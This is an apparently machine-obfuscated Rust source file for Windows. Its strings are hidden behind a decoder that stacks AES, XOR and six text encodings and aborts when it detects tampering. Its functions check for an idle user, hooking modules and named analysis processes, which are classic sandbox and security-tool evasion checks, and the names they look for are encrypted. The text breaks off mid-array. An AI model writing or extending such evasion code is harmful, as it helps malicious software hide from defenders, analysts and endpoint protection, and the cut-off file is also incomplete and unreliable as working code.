

use std::path::Path;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::Diagnostics::ToolHelp::CreateToolhelp32Snapshot;
use windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32;
use windows::Win32::System::Diagnostics::ToolHelp::Process32First;
use windows::Win32::System::Diagnostics::ToolHelp::Process32Next;
use windows::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPPROCESS;
use windows::Win32::System::ProcessStatus::EnumProcessModulesEx;
use windows::Win32::System::ProcessStatus::GetModuleBaseNameA;
use windows::Win32::System::ProcessStatus::LIST_MODULES_ALL;
use windows::Win32::System::Registry::HKEY_LOCAL_MACHINE;
use windows::Win32::System::Registry::KEY_READ;
use windows::Win32::System::Registry::RegCloseKey;
use windows::Win32::System::Registry::RegOpenKeyExA;
use windows::Win32::System::SystemInformation::GetTickCount64;
use windows::Win32::System::Threading::GetCurrentProcess;
use windows::Win32::UI::Input::KeyboardAndMouse::GetLastInputInfo;
use windows::Win32::UI::Input::KeyboardAndMouse::LASTINPUTINFO;
use windows::core::PCSTR;

#[inline(never)]
fn checksum_pmc_bq_sfhabtx(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_g_n_ydeodepcqq(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_pmc_bq_sfhabtx(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

  pub fn check_user_activity () -> bool { let mut last_input_info : LASTINPUTINFO = unsafe { std :: mem :: zeroed () } ; last_input_info . cbSize = std :: mem :: size_of :: < LASTINPUTINFO > () as u32 ; let result = unsafe { GetLastInputInfo (& mut last_input_info) } ; if result . as_bool () { let last_input_tick = last_input_info . dwTime as u64 ; let current_tick = unsafe { GetTickCount64 () } ; if current_tick - last_input_tick > (6324 + 113676) { return true ; } } false } pub fn check_for_hooking () -> bool { let mut modules = [HMODULE :: default () ; (367 + 657)] ; let mut needed = 0 ; let process_handle = unsafe { GetCurrentProcess () } ; if unsafe { EnumProcessModulesEx (process_handle , modules . as_mut_ptr () , std :: mem :: size_of_val (& modules) as u32 , & mut needed , LIST_MODULES_ALL) } . is_ok () { let module_count = needed as usize / std :: mem :: size_of :: < HMODULE > () ; for i in 0 .. module_count { let mut module_name = [0u8 ; (71 + 185)] ; if unsafe { GetModuleBaseNameA (process_handle , modules [i] , & mut module_name) } > 0 { let name_len = module_name . iter () . position (| & c | c == 0) . unwrap_or (module_name . len ()) ; let name = String :: from_utf8_lossy (& module_name [.. name_len]) . to_lowercase () ; let suspicious_modules = [decode_g_n_ydeodepcqq (& [155 , 100 , 36 , 0 , 249 , 205 , 72 , 189 , 18 , 109 , 93 , 128 , 194 , 6 , 106 , 57 , 214 , 70 , 21 , 178 , 239 , 30 , 137 , 78 , 98 , 2 , 212 , 8 , 123 , 34 , 188 , 236 , 156 , 239 , 7 , 246 , 4 , 125 , 139 , 169 , 51 , 228 , 98 , 105 , 156 , 214 , 223 , 136 , 190 , 15 , 76 , 42 , 195 , 231 , 198 , 160 , 147 , 48 , 185 , 169 , 222 , 182 , 29 , 172 , 215 , 193 , 253 , 74 , 188 , 183 , 72 , 183 , 209 , 151 , 5 , 73 , 246 , 15 , 119 , 179 , 43 , 31 , 169 , 2 , 177 , 0 , 52 , 35 , 107 , 248 , 165 , 57 , 74 , 85 , 194 , 122 , 3 , 223 , 192 , 171 , 40 , 0 , 127 , 108 , 112 , 214 , 211 , 91 , 72 , 23 , 72 , 63 , 107 , 37 , 196 , 22 , 11 , 74 , 22 , 80 , 26 , 158 , 173 , 140 , 252 , 67 , 18 , 194 , 168 , 209 , 143 , 33 , 248 , 130 , 23 , 249 , 30 , 165 , 98 , 99 , 251 , 107 , 17 , 15] , & [63 , 229 , 210 , 48 , 251 , 227 , 74 , 61 , 150 , 3 , 56 , 153 , 106 , 124 , 56 , 24 , 114 , 227 , 174 , 181 , 148 , 130 , 110 , 61 , 40 , 147 , 124 , 227 , 115 , 156 , 152 , 118 , 76 , 36 , 53 , 117 , 84 , 138 , 132 , 169 , 169 , 94 , 142 , 126 , 222 , 246 , 180 , 235 , 199 , 46 , 20 , 43 , 32 , 139 , 192 , 123 , 204 , 38 , 131 , 30 , 140 , 215 , 40 , 160 , 188 , 203 , 62 , 251 , 176 , 169 , 185 , 46 , 112 , 135 , 73 , 28 , 1 , 146 , 155 , 235 , 83 , 34 , 236 , 78 , 249 , 31 , 153 , 25] , 28797755720778u64) , decode_g_n_ydeodepcqq (& [24 , 168 , 144 , 229 , 240 , 115 , 19 , 95 , 211 , 90 , 207 , 182 , 119 , 243 , 219 , 54 , 6 , 226 , 167 , 59 , 60 , 3 , 120 , 242 , 206 , 69 , 218 , 175 , 185 , 27 , 113 , 122 , 160 , 244 , 186 , 9 , 206 , 121 , 91 , 246 , 103 , 217 , 76 , 215 , 43 , 230 , 148 , 113 , 120 , 10 , 216 , 18 , 238 , 66 , 140 , 129 , 247 , 249 , 45 , 6 , 74 , 18 , 197 , 158 , 87 , 103 , 180 , 249 , 176 , 24 , 251 , 254 , 254 , 213 , 188 , 231 , 71 , 5 , 149 , 215 , 72 , 241 , 251 , 15 , 204 , 221 , 137 , 213 , 205 , 92 , 184 , 108 , 240 , 99 , 74 , 154 , 155 , 248 , 159 , 137 , 59 , 101 , 156 , 228 , 185 , 103 , 169 , 120 , 156 , 232 , 241 , 49 , 52 , 47 , 194 , 72 , 201 , 159 , 223 , 64 , 211 , 155 , 110 , 26 , 71 , 82 , 225 , 204 , 250 , 137 , 128 , 36 , 180 , 150 , 135 , 61 , 45 , 90 , 235 , 139 , 58 , 132 , 130 , 5] , & [254 , 198 , 20 , 207 , 227 , 126 , 47 , 48 , 35 , 21 , 133 , 17 , 148 , 15 , 213 , 180 , 192 , 157 , 245 , 113 , 199 , 226 , 205 , 232 , 138 , 205 , 243 , 97 , 102 , 107 , 42 , 209 , 64 , 46 , 6 , 162 , 104 , 152 , 67 , 156 , 30 , 30 , 50 , 204 , 117 , 197 , 240 , 64 , 55 , 115 , 41 , 129 , 211 , 197 , 113 , 75 , 75 , 88 , 83 , 97 , 37 , 76 , 192 , 58 , 59 , 127 , 221 , 85 , 0 , 172 , 45 , 101 , 204 , 164 , 9 , 131 , 82 , 68 , 50 , 27 , 205 , 63 , 183 , 245 , 83 , 156 , 51 , 171] , 28552942584902u64) , decode_g_n_ydeodepcqq (& [23 , 255 , 36 , 186 , 38 , 41 , 145 , 137 , 170 , 66 , 51 , 155 , 206 , 52 , 72 , 136 , 104 , 211 , 112 , 85 , 254 , 230 , 41 , 21 , 98 , 102 , 147 , 163 , 98 , 152 , 21 , 59 , 108 , 99 , 186 , 73 , 119 , 47 , 6 , 160 , 40 , 106 , 44 , 209 , 72 , 36 , 252 , 222 , 28 , 124 , 233 , 205 , 233 , 120 , 242 , 13 , 169 , 35 , 138 , 44 , 118 , 236 , 20 , 4 , 24 , 178 , 149 , 77 , 196 , 85 , 115 , 84 , 52 , 83 , 188 , 248 , 141 , 250 , 188 , 52 , 248 , 104 , 208 , 116 , 86 , 81 , 3 , 36 , 122 , 50 , 96 , 198 , 233 , 120 , 111 , 23 , 131 , 43 , 247 , 250 , 33 , 253 , 78 , 197 , 86 , 250 , 57 , 127 , 123 , 185 , 121 , 86 , 103 , 246 , 223 , 193 , 72 , 30 , 183 , 81 , 206 , 211 , 246 , 210 , 101 , 19 , 15 , 62 , 149 , 125 , 88 , 206 , 69 , 7 , 5 , 90 , 39 , 180 , 54 , 5 , 132 , 196 , 149 , 167 , 245 , 126 , 4 , 221 , 10 , 190 , 131 , 135 , 83 , 22 , 126 , 236 , 11 , 195 , 32 , 95] , & [185 , 48 , 99 , 83 , 160 , 167 , 4 , 15 , 75 , 211 , 253 , 88 , 204 , 36 , 221 , 121 , 144 , 74 , 243 , 23 , 43 , 91 , 167 , 122 , 205 , 254 , 115 , 124 , 34 , 247 , 108 , 105 , 70 , 87 , 169 , 111 , 250 , 253 , 57 , 202 , 149 , 165 , 145 , 89 , 189 , 89 , 48 , 115 , 139 , 169 , 199 , 190 , 251 , 148 , 241 , 93 , 226 , 38 , 251 , 60 , 68 , 212 , 26 , 52 , 86 , 18 , 208 , 21 , 136 , 236 , 13 , 205 , 164 , 179 , 254 , 62 , 55 , 50 , 78 , 148 , 152 , 66 , 47 , 179 , 229 , 9 , 41 , 78] , 40192303957280u64) , decode_g_n_ydeodepcqq (& [63 , 216 , 64 , 223 , 196 , 243 , 108 , 108 , 200 , 122 , 190 , 225 , 219 , 90 , 33 , 147 , 20 , 248 , 221 , 51 , 118 , 126 , 38 , 19 , 100 , 106 , 26 , 122 , 76 , 145 , 108 , 67 , 42 , 237 , 157 , 26 , 192 , 69 , 237 , 177 , 24 , 88 , 247 , 137 , 22 , 74 , 176 , 34 , 229 , 53 , 34 , 168 , 160 , 227 , 252 , 60 , 82 , 68 , 29 , 250 , 123 , 214 , 107 , 161 , 63 , 106 , 219 , 114 , 76 , 136 , 91 , 138 , 231 , 248 , 207 , 244 , 129 , 178 , 37 , 21 , 190 , 237 , 115 , 8 , 103 , 233 , 139 , 213 , 131 , 148 , 32 , 120 , 252 , 136 , 10 , 20 , 1 , 224 , 45 , 161 , 66 , 176 , 139 , 113 , 247 , 87 , 85 , 14 , 230 , 39 , 134 , 76 , 165 , 123 , 78 , 187 , 141 , 11 , 47 , 247 , 236 , 159 , 190 , 172 , 86 , 101 , 134 , 186 , 3 , 30 , 164 , 226 , 181 , 54 , 205 , 220 , 2 , 28 , 12 , 223 , 250 , 24 , 34 , 195] , & [184 , 232 , 147 , 156 , 75 , 137 , 22 , 237 , 50 , 131 , 95 , 187 , 96 , 180 , 233 , 104 , 151 , 133 , 73 , 118 , 76 , 87 , 167 , 121 , 36 , 38 , 206 , 167 , 42 , 48 , 249 , 202 , 153 , 15 , 180 , 211 , 21 , 165 , 184 , 41 , 67 , 130 , 50 , 57 , 43 , 80 , 72 , 14 , 137 , 236 , 195 , 232 , 57 , 185 , 197 , 137 , 74 , 63 , 185 , 191 , 56 , 74 , 248 , 46 , 93 , 179 , 84 , 63 , 131 , 181 , 94 , 23 , 173 , 27 , 123 , 89 , 233 , 146 , 109 , 104 , 244 , 178 , 146 , 198 , 109 , 74 , 116 , 28] , 30202210026603u64) , decode_g_n_ydeodepcqq (& [6 , 132 , 231 , 160 , 47 , 211 , 254 , 104 , 58 , 253 , 197 , 164 , 162 , 19 , 147 , 215 , 209 , 63 , 137 , 6 , 143 , 244 , 133 , 186 , 198 , 75 , 210 , 58 , 143 , 172 , 99 , 3 , 140 , 48 , 156 , 126 , 136 , 80 , 16 , 53 , 101 , 43 , 25 , 153 , 183 , 169 , 203 , 133 , 136 , 60 , 218 , 221 , 40 , 72 , 8 , 12 , 111 , 208 , 220 , 60 , 101 , 90 , 90 , 247 , 128 , 111 , 16 , 222 , 62 , 140 , 52 , 124 , 251 , 182 , 28 , 42 , 228 , 236 , 240 , 244 , 113 , 117 , 140 , 234 , 59 , 33 , 13 , 154 , 86 , 50 , 168 , 144 , 74 , 236 , 200 , 32 , 248 , 214 , 12 , 208 , 164 , 173 , 240 , 42 , 127 , 66 , 94 , 161 , 15 , 108 , 38 , 145 , 115 , 132 , 122 , 231 , 192 , 84 , 151 , 86 , 93 , 88 , 0 , 170 , 157 , 57 , 91 , 26 , 75 , 18 , 101 , 12 , 241 , 23 , 134 , 43 , 36 , 120 , 114 , 243 , 180 , 222 , 52 , 119] , & [166 , 95 , 119 , 230 , 79 , 9 , 228 , 84 , 241 , 67 , 100 , 97 , 26 , 200 , 10 , 103 , 48 , 106 , 49 , 9 , 115 , 69 , 124 , 110 , 229 , 27 , 133 , 14 , 50 , 70 , 161 , 6 , 159 , 8 , 253 , 220 , 123 , 66 , 108 , 29 , 104 , 17 , 236 , 254 , 67 , 81 , 135 , 224 , 215 , 82 , 83 , 224 , 32 , 28 , 188 , 197 , 191 , 43 , 125 , 108 , 26 , 21 , 212 , 71 , 254 , 107 , 44 , 77 , 238 , 11 , 168 , 87 , 11 , 87 , 119 , 234 , 144 , 177 , 1 , 76 , 164 , 46 , 76 , 89 , 102 , 91 , 43 , 52] , 29059748725836u64) , decode_g_n_ydeodepcqq (& [214 , 222 , 11 , 214 , 127 , 179 , 131 , 74 , 138 , 245 , 35 , 201 , 23 , 226 , 212 , 0 , 19 , 130 , 158 , 19 , 152 , 255 , 245 , 145 , 187 , 202 , 155 , 45 , 14 , 187 , 191 , 63 , 18 , 84 , 165 , 174 , 99 , 178 , 138 , 210 , 232 , 81 , 27 , 148 , 128 , 31 , 44 , 10 , 115 , 197 , 64 , 111 , 170 , 171 , 166 , 131 , 247 , 112 , 169 , 50 , 121 , 109 , 135 , 206 , 99 , 219 , 120 , 200 , 80 , 104 , 6 , 63 , 252 , 198 , 233 , 101 , 167 , 69 , 66 , 55 , 137 , 154 , 155 , 51 , 217 , 86 , 49 , 42 , 140 , 190 , 144 , 141 , 121 , 94 , 179 , 214 , 241 , 100 , 109 , 129 , 30 , 136 , 124 , 77 , 188 , 49 , 101 , 54 , 107 , 162 , 41 , 29 , 234 , 214 , 208 , 151 , 120 , 85 , 249 , 24 , 180 , 72 , 218 , 58 , 213 , 205 , 140 , 171 , 96 , 113 , 113 , 244 , 132 , 170 , 96 , 18 , 199 , 31 , 65 , 167 , 182 , 253 , 94 , 104] , & [97 , 167 , 158 , 135 , 129 , 43 , 161 , 97 , 195 , 127 , 233 , 138 , 213 , 12 , 54 , 180 , 193 , 131 , 195 , 54 , 220 , 38 , 46 , 220 , 59 , 180 , 5 , 93 , 89 , 218 , 230 , 238 , 47 , 210 , 4 , 150 , 134 , 98 , 38 , 93 , 83 , 171 , 189 , 86 , 127 , 154 , 43 , 146 , 117 , 204 , 94 , 68 , 152 , 164 , 154 , 150 , 78 , 14 , 103 , 31 , 167 , 110 , 178 , 31 , 221 , 94 , 101 , 244 , 68 , 12 , 233 , 64 , 194 , 243 , 180 , 77 , 226 , 123 , 48 , 138 , 148 , 16 , 80 , 218 , 220 , 118 , 194 , 205] , 25366076851219u64) ,] ; for suspicious in suspicious_modules { if name . contains (suspicious) { return true ; } } } } } false } pub fn check_processes () -> bool { let suspicious_processes = [decode_g_n_ydeodepcqq (& [45 , 244 , 26 , 66 , 195 , 56 , 248 , 243 , 241 , 207 , 64 , 161 , 76 , 222 , 243 , 130 , 20 , 119 , 54 , 125 , 98 , 137 , 109 , 251 , 159 , 30 , 169 , 232 , 74 , 112 , 23 , 13 , 126 , 11 , 95 , 70 , 3 , 154 , 63 , 234 , 232 , 217 , 166 , 22 , 99 , 95 , 134 , 135 , 243 , 200 , 104 , 196 , 16 , 168 , 143 , 79 , 225 , 101 , 78 , 147 , 136 , 156 , 48 , 79 , 92 , 52 , 215 , 211 , 15 , 105 , 249 , 19 , 133 , 170 , 73 , 81 , 108 , 227 , 206 , 255 , 138 , 44 , 173 , 217 , 220 , 141 , 75 , 97 , 215 , 185 , 132 , 203 , 144 , 35 , 251 , 115 , 222 , 229 , 145 , 203 , 244 , 82 , 205 , 57 , 29 , 210 , 205 , 104 , 34 , 103 , 229 , 81 , 200 , 27 , 93 , 89 , 238 , 204 , 81 , 84 , 6 , 67 , 200 , 45 , 39 , 189 , 118 , 14 , 140 , 106 , 184 , 107 , 34 , 232 , 17 , 2 , 233 , 199 , 125 , 216 , 167 , 175 , 239 , 126 , 149 , 107 , 93 , 93 , 49 , 32 , 53 , 65 , 39 , 13 , 210 , 88 , 84 , 218 , 191 , 240] , & [113 , 77 , 128 , 23 , 123 , 78 , 126 , 234 , 254 , 39 , 211 , 26 , 109 , 176 , 24 , 86 , 156 , 169 , 50 , 211 , 208 , 88 , 244 , 134 , 52 , 107 , 176 , 107 , 47 , 131 , 161 , 123 , 73 , 76 , 46 , 83 , 33 , 147 , 217 , 171 , 19 , 169 , 13 , 184 , 252 , 188 , 122 , 166 , 22 , 189 , 194 , 111 , 164 , 75 , 81 , 191 , 153 , 113 , 176 , 129 , 133 , 50 , 46 , 55 , 27 , 105 , 41 , 98 , 21 , 236 , 156 , 108 , 145 , 239 , 41 , 69 , 204 , 102 , 51 , 24 , 14 , 188 , 8 , 0 , 200 , 245 , 32 , 63] , 36236639077616u64) , decode_g_n_ydeodepcqq (& [15 , 254 , 4 , 74 , 36 , 236 , 85 , 122 , 220 , 133 , 166 , 208 , 4 , 47 , 230 , 152 , 241 , 79 , 20 , 24 , 119 , 219 , 220 , 179 , 30 , 51 , 217 , 231 , 221 , 174 , 20 , 229 , 214 , 247 , 120 , 96 , 197 , 215 , 131 , 190 , 99 , 66 , 180 , 22 , 75 , 171 , 144 , 140 , 189 , 229 , 106 , 155 , 24 , 39 , 12 , 208 , 175 , 133 , 192 , 171 , 5 , 233 , 120 , 144 , 155 , 21 , 157 , 134 , 118 , 180 , 97 , 101 , 232 , 54 , 80 , 227 , 246 , 249 , 103 , 129 , 211 , 25 , 174 , 54 , 226 , 206 , 86 , 229 , 42 , 135 , 124 , 194 , 76 , 102 , 86 , 49 , 237 , 221 , 68 , 221 , 147 , 216 , 44 , 158 , 213 , 65 , 107 , 102 , 105 , 13 , 134 , 30 , 131 , 88 , 23 , 218 , 85 , 0 , 220 , 174 , 120 , 176 , 179 , 7 , 82 , 140 , 170 , 229 , 222 , 12 , 165 , 172 , 112 , 190 , 101 , 201 , 157 , 25 , 231 , 81 , 192 , 55 , 154 , 109 , 63 , 23 , 153 , 107 , 5 , 137 , 151 , 217 , 62 , 213 , 119 , 8 , 19 , 142 , 148 , 138] , & [76 , 161 , 32 , 37 , 213 , 156 , 77 , 241 , 216 , 55 , 27 , 67 , 43 , 207 , 44 , 88 , 244 , 101 , 134 , 77 , 223 , 147 , 113 , 205 , 5 , 12 , 194 , 103 , 116 , 17 , 71 , 173 , 222 , 194 , 69 , 47 , 91 , 162 , 92 , 82 , 98 , 94 , 43 , 18 , 114 , 67 , 154 , 208 , 136 , 165 , 90 , 254 , 209 , 100 , 138 , 240 , 1 , 52 , 80 , 57 , 177 , 142 , 12 , 22 , 189 , 159 , 177 , 202 , 163 , 25 , 141 , 89 , 200 , 67 , 103 , 197 , 134 , 240 , 11 , 50 , 205 , 65 , 36 , 154 , 222 , 174 , 219 , 217] , 36283883717865u64) , decode_g_n_ydeodepcqq (& [143 , 36 , 134 , 67 , 144 , 7 , 52 , 226 , 226 , 147 , 224 , 52 , 32 , 7 , 75 , 54 , 248 , 121 , 67 , 249 , 218 , 80 , 46 , 15 , 5 , 87 , 240 , 139 , 86 , 87 , 246 , 171 , 106 , 251 , 136 , 204 , 123 , 169 , 108 , 111 , 87 , 204 , 99 , 28 , 201 , 217 , 175 , 56 , 152 , 27 , 135 , 163 , 208 , 98 , 43 , 39 , 125 , 153 , 124 , 109 , 132 , 234 , 52 , 232 , 138 , 67 , 103 , 0 , 217 , 110 , 9 , 222 , 143 , 64 , 34 , 208 , 155 , 172 , 94 , 233 , 178 , 51 , 31 , 102 , 126 , 87 , 167 , 255 , 182 , 250 , 87 , 82 , 124 , 8 , 13 , 83 , 243 , 83 , 247 , 170 , 235 , 54 , 232 , 233 , 43 , 189 , 220 , 171 , 48 , 72 , 131 , 71 , 252 , 241 , 218 , 70 , 62 , 16 , 201 , 37 , 186 , 98 , 243 , 192 , 46 , 38 , 199 , 123 , 164 , 231 , 108 , 196 , 109 , 240 , 68 , 124 , 221 , 12 , 192 , 51 , 32 , 66 , 5 , 227 , 49 , 236 , 65 , 145 , 144 , 232 , 34 , 78 , 208 , 7 , 5 , 117 , 146 , 65 , 228 , 47 , 222 , 32 , 43 , 82 , 249 , 182 , 150 , 13 , 227 , 198 , 129 , 196 , 21 , 29 , 60 , 66 , 219 , 39 , 160 , 101 , 109 , 36 , 223 , 14 , 76 , 114 , 10 , 212 , 244 , 186 , 208 , 18] , & [21 , 226 , 15 , 191 , 91 , 101 , 155 , 25 , 207 , 235 , 175 , 62 , 146 , 161 , 11 , 182 , 57 , 162 , 4 , 193 , 161 , 134 , 42 , 237 , 72 , 116 , 67 , 145 , 250 , 163 , 100 , 94 , 151 , 159 , 175 , 104 , 93 , 168 , 18 , 25 , 139 , 249 , 107 , 104 , 27 , 254 , 34 , 124 , 124 , 32 , 5 , 155 , 179 , 195 , 159 , 153 , 159 , 193 , 245 , 200 , 254 , 30 , 211 , 221 , 52 , 9 , 238 , 54 , 170 , 197 , 217 , 193 , 94 , 182 , 94 , 155 , 231 , 145 , 34 , 213 , 142 , 110 , 248 , 252 , 246 , 251 , 3 , 97] , 48825188222403u64) , decode_g_n_ydeodepcqq (& [202 , 199 , 117 , 18 , 30 , 120 , 204 , 71 , 90 , 147 , 9 , 202 , 241 , 30 , 242 , 40 , 218 , 206 , 142 , 183 , 62 , 69 , 10 , 103 , 202 , 35 , 179 , 10 , 96 , 77 , 201 , 120 , 208 , 196 , 47 , 116 , 200 , 111 , 128 , 98 , 120 , 15 , 1 , 161 , 195 , 254 , 0 , 17 , 255 , 119 , 152 , 245 , 35 , 238 , 193 , 153 , 109 , 208 , 105 , 15 , 226 , 117 , 42 , 111 , 148 , 66 , 123 , 99 , 110 , 64 , 54 , 197 , 247 , 129 , 255 , 246 , 118 , 246 , 192 , 83 , 160 , 136 , 135 , 167 , 167 , 205 , 73 , 129 , 240 , 209 , 236 , 161 , 147 , 67 , 249 , 94 , 182 , 145 , 26 , 226 , 42 , 32 , 154 , 61 , 132 , 109 , 222 , 55 , 239 , 152 , 68 , 249 , 150 , 96 , 100 , 76 , 122 , 94 , 121 , 128 , 57 , 128 , 22 , 121 , 139 , 93 , 69 , 204 , 109 , 192 , 158 , 15 , 188 , 43 , 127 , 65 , 143 , 223 , 208 , 254 , 150 , 14 , 110 , 145] , & [151 , 226 , 219 , 163 , 78 , 228 , 3 , 198 , 81 , 88 , 206 , 82 , 228 , 242 , 88 , 233 , 179 , 89 , 197 , 84 , 28 , 140 , 115 , 196 , 196 , 119 , 236 , 254 , 160 , 3 , 2 , 19 , 38 , 180 , 25 , 155 , 112 , 218 , 154 , 137 , 59 , 140 , 15 , 157 , 80 , 156 , 43 , 37 , 95 , 99 , 216 , 208 , 179 , 128 , 119 , 78 , 149 , 194 , 198 , 154 , 15 , 22 , 104 , 224 , 206 , 13 , 174 , 109 , 222 , 246 , 87 , 45 , 212 , 142 , 127 , 193 , 208 , 189 , 236 , 223 , 65 , 208 , 215 , 60 , 29 , 69 , 180 , 49] , 29983166694511u64) , decode_g_n_ydeodepcqq (& [211 , 37 , 184 , 112 , 232 , 183 , 190 , 229 , 153 , 38 , 22 , 115 , 7 , 37 , 220 , 218 , 243 , 79 , 108 , 151 , 27 , 150 , 225 , 161 , 177 , 113 , 142 , 90 , 240 , 100 , 67 , 133 , 234 , 221 , 214 , 116 , 130 , 163 , 179 , 62 , 65 , 252 , 214 , 96 , 27 , 151 , 214 , 54 , 88 , 123 , 128 , 157 , 108 , 193 , 156 , 210 , 195 , 39 , 132 , 190 , 19 , 124 , 246 , 158 , 195 , 5 , 37 , 201 , 74 , 136 , 234 , 121 , 82 , 114 , 246 , 138 , 156 , 188 , 145 , 128 , 144 , 172 , 59 , 148 , 170 , 254 , 88 , 150 , 15 , 164 , 216 , 111 , 230 , 75 , 149 , 205 , 15 , 75 , 50 , 58 , 82 , 163 , 228 , 26 , 59 , 202 , 250 , 72 , 83 , 101 , 207 , 135 , 0 , 231 , 14 , 135 , 51 , 223 , 170 , 210 , 1 , 197 , 202 , 250 , 109 , 59 , 58 , 110 , 192 , 98 , 44 , 32 , 131 , 55 , 75 , 146 , 156 , 146 , 118 , 39 , 54 , 107 , 223 , 82] , & [182 , 109 , 130 , 59 , 251 , 136 , 185 , 47 , 46 , 240 , 180 , 170 , 201 , 197 , 7 , 236 , 232 , 223 , 92 , 167 , 43 , 174 , 93 , 227 , 59 , 159 , 57 , 179 , 71 , 218 , 159 , 6 , 213 , 197 , 78 , 70 , 209 , 190 , 118 , 68 , 118 , 117 , 13 , 14 , 124 , 218 , 66 , 244 , 248 , 106 , 216 , 153 , 193 , 40 , 153 , 84 , 48 , 114 , 144 , 63 , 243 , 200 , 193 , 213 , 81 , 80 , 167 , 252 , 243 , 246 , 32 , 246 , 101 , 1 , 0 , 234 , 76 , 21 , 130 , 137 , 93 , 237 , 200 , 57 , 11 , 78 , 201 , 255] , 24438363915257u64) , decode_g_n_ydeodepcqq (& [130 , 70 , 172 , 42 , 18 , 51 , 101 , 93 , 180 , 174 , 47 , 149 , 8 , 67 , 173 , 1 , 215 , 93 , 195 , 198 , 107 , 115 , 20 , 123 , 123 , 175 , 192 , 28 , 62 , 17 , 28 , 3 , 81 , 71 , 122 , 110 , 39 , 227 , 250 , 148 , 147 , 13 , 171 , 204 , 229 , 112 , 53 , 44 , 125 , 109 , 235 , 33 , 84 , 10 , 95 , 108 , 142 , 198 , 177 , 87 , 176 , 246 , 255 , 10 , 41 , 150 , 84 , 127 , 178 , 148 , 164 , 128 , 254 , 226 , 59 , 175 , 252 , 246 , 178 , 95 , 79 , 239 , 84 , 92 , 7 , 132 , 134 , 124 , 182 , 186 , 186 , 104 , 76 , 187 , 165 , 207 , 60 , 174 , 84 , 142 , 222 , 11 , 45 , 147 , 138 , 162 , 237 , 176 , 44 , 209 , 172 , 253 , 98 , 150 , 75 , 162 , 180 , 123 , 136 , 233 , 28 , 199 , 208 , 228 , 47 , 38 , 182 , 86 , 211 , 52 , 232 , 75 , 216 , 179 , 50 , 1 , 146 , 47 , 95 , 73 , 81 , 20 , 74 , 212 , 46 , 34 , 202 , 157 , 78 , 57 , 203 , 153 , 249 , 164 , 155 , 180 , 199 , 218 , 191 , 121] , & [204 , 218 , 227 , 247 , 174 , 69 , 104 , 132 , 159 , 133 , 213 , 195 , 171 , 200 , 15 , 103 , 92 , 204 , 38 , 115 , 252 , 14 , 164 , 37 , 158 , 182 , 19 , 30 , 37 , 0 , 140 , 122 , 8 , 20 , 88 , 233 , 102 , 109 , 219 , 167 , 26 , 167 , 99 , 102 , 11 , 159 , 7 , 141 , 37 , 33 , 120 , 250 , 147 , 237 , 173 , 213 , 196 , 208 , 105 , 67 , 65 , 30 , 134 , 3 , 103 , 199 , 225 , 254 , 18 , 106 , 193 , 195 , 232 , 164 , 155 , 99 , 105 , 238 , 185 , 202 , 47 , 66 , 36 , 143 , 42 , 113 , 129 , 65] , 41562398524737u64) , decode_g_n_ydeodepcqq (& [250 , 52 , 0 , 32 , 145 